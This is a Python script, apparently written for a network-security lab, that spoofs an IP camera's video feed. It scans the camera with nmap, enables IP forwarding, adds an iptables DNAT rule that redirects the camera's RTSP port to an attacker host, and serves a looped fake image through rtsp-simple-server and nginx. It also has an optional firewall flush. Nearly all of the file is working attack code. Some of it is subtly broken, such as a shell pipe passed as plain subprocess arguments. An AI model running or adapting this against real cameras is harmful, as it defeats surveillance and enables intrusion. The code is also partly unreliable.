import subprocess
import os
import time
import sys

# IP's
camera_ip = "192.168.88.115"
attacker_ip = "192.168.88.117"

# Path of the fake image to be used for the stream
image_path = "/home/netsec/fake.jpg"

# Two ports used for the stream such that NGINX and RTSP server do not interfere
# NGINX used for URL format acceptance of special characters in the server
server_port = "8554"
format_port = "8556"

# Check for root privileges
def check_root():
    if os.geteuid() != 0:
        print("must be run as root")
        sys.exit(1)

# Check open ports on the camera
def check_open_ports():
    print("Checking open camera ports")
    subprocess.run(['nmap', '-p', '1-65535', camera_ip])

# Test port communication
def test_port():
    print("Testing port communication...")
    subprocess.run(['nc', '-vz', camera_ip, '554'])
    print("Testing RTSP port...")
    subprocess.run(['sudo', 'netstat', '-tuln', '|', 'grep', '8554'])

# Enable IP forwarding
def enable_ip_forwarding():
    print("IP forwarding")
    subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'])

# Set up iptables for port redirection
def setup_iptables():
    print("iptables for port redirection")
    subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '-d', camera_ip, '--dport', '554', '-j', 'DNAT', '--to-destination', f'{attacker_ip}:{format_port}'])
    subprocess.run(['sudo', 'iptables', '-L', '-t', 'nat'])
# Configure the RTSP server
def configure_rtsp_server():
    print("configuring server")

    # Read existing configuration
    config_file = "rtsp-simple-server.yml"
    with open(config_file, "r") as f:
        lines = f.readlines()

    # Check if rtspAddress and axis_media_media_amp path exists
    address_updated = False
    path_exists = False
    with open(config_file, "w") as f:
        for line in lines:
            if line.startswith("rtspAddress:"):
                f.write(f"rtspAddress: :{format_port}\n")
                address_updated = True
            elif "axis_media_media_amp" in line:
                path_exists = True
            f.write(line)

        # Append rtspAddress if it doesn't exist
        if not address_updated:
            f.write(f"rtspAddress: :{format_port}\n")
        
        # Append axis_media_media_amp configuration if it doesn't exist
        if not path_exists:
            f.write("paths:\n")
            f.write("  axis_media_media_amp:\n")
            f.write(f"    source: record\n")
            f.write(f"    runOnDemand: ffmpeg -re -loop 1 -i {image_path} -f lavfi -i anullsrc -c:v libx264 -tune zerolatency -pix_fmt yuv420p -s 1280x720 -b:v 500k -c:a aac -ar 44100 -ac 2 -f rtsp rtsp://localhost:{format_port}/axis_media_media_amp\n")
# Run the RTSP server
def run_rtsp_server():
    print("starting RTSP server")
    subprocess.Popen(['./rtsp-simple-server'])

# Configure nginx
def configure_nginx():
    print("Configuring nginx")
    nginx_config = f"""
server {{
    listen {server_port};
    location / {{
        proxy_pass http://localhost:{format_port}/;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }}
}}
"""
    with open("/etc/nginx/sites-available/default", "w") as f:
        f.write(nginx_config)
    subprocess.run(['systemctl', 'restart', 'nginx'])

# Check firewall rules
def check_firewall_rules():
    print("Checking firewall rules")
    subprocess.run(['iptables', '-L', '-v', '-n'])

# disable firewall temporarily
def disable_firewall():
    print("Disabling firewall")
    subprocess.run(['iptables', '-F'])

def main():
    check_root()
    check_open_ports()
    test_port()
    enable_ip_forwarding()
    setup_iptables()
    configure_rtsp_server()
    run_rtsp_server()
    configure_nginx()
    check_firewall_rules()
    # disable_firewall()

    print("END")
    while True:
        time.sleep(10)

if __name__ == "__main__":
    main()
